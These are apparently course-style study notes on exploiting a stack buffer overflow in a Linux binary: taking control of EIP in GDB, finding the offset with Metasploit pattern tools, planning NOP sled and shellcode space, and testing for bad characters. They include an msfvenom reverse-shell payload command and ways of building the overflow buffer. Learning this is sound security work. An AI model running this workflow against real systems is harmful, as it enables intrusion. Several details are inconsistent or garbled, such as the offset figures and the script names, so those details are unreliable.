## Take Control of EIP

one of the most important aspects of a stack-based buffer overflow is to get the instruction pointer (EIP) under control, so we can tell it to which address it should jump. This will make the EIP point to the address where our shellcode starts and causes the CPU to execute it

we can execute commands in GDB using python, which will serve as input

	(gdb) run $(python3 -c "print '\x55' * 1200")

inserting 1200 "U"s (hex "55") as input we can see from register information that we have overwritten the EIP, which points to the next instruction to be executed

### Determine The Offset

the offset is used to determine how many bytes are needed to overwrite the buffer and how much space we have around our shellcode

we can use the MSF to create a pattern that will help determining the offset with the script *pattern_create.rb*

	$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l [length] > pattern.txt

using the created pattern in

	(gdb) run $(python -c "print '[pattern-created]'")

now getting the value from EIP with *info registers eip*

determining the offset with *pattern_create.rb*

	$ /usr/share/metasploit-framework/tools/exploit/patters_offset.rb -q [value-from-eip-register]

it will then print the exact offset

	[*] Exact match at offset 1036

now using this offset it is possible to write directly to the eip register

	 (gdb) run $(python -c "print '\x55' * 1036 + '\x73' * 4")
[the value in the eip register will be 0x73737373]


## Determine the Length for Shellcode 

now we should find out how much space we have for our shellcode to perform the action we want, it is trendy and useful for us to exploit such a vulnerability to get a reverse shell. First, we have to find out approximately how big our shellcode will be that we will insert, and for hits, we will use msfvenom

```bash
$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c
``` 

output shows that the payload will have a size of 68 bytes, as a precaution we should try to take a larger range if the shellcode increases due to later specifications

it can be often useful to insert some **no operation instruction (NOPS)** before our shellcode begins so that it can be executed cleanly

1. We need a total of 1040 bytes to get to the EIP.
2. Here, we can use an additional 100 bytes of NOPs.
3. 150 bytes for our shellcode

>Buffer = "\\x55" \* $(1040 -100 -150 -4)$
>NOPs =  "\\x90" \* $100$
>Shellcode = "\\x44" \* $150$
>EIP = "\\x66" \* $4$

Now we can try to find out how much space we have available to insert our shellcode

```
(gdb) run $(python -c 'print' "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')
```

#### Questions

How large can our shellcode theoretically become if we count NOPS and the shellcode size together?
	R: 250 byt

## Identification of Bad Characters

previously in UNIX-like operating systems, binaries started with two bytes containing a "magic number" that determines the file type. In the beginnning, this was used to identify object files for different platforms. Gradually this concept was transferred to other files, and now almost every file contains a magic number.

Such reserved characters also exist in applications, but they do not always occur and are not still the same. These reserved characters, also known as bad characters can vary, but often we will see characters like this:

- \\x00 - Null byte
- \\x0a - Line Feed
- \\x0d - Carriage Return
- \\xFF - Form feed

using a character list CHARS that includes hexadecimal characters from 0x00 to 0xff it is possible to find out all characters we have to avoid when generating our shellcode

### calculating CHARS length

```bash
$ echo $CHARS | sed "s/\\x/ /g" | wc -w

output:
256
```

the string is 256 bytes long. So we need to calculate our buffer again:

>Buffer = "\\x55" \* $(1040 -256 -4)$
>Chars = $CHARS [256 bytes long]
>EIP = "\\x66" \* $4$

set a breakpoint at bowfunc function so program does not crash and we can analyze the memory's content

```bash
(gdb) break bowfunc
```

### Send CHARS
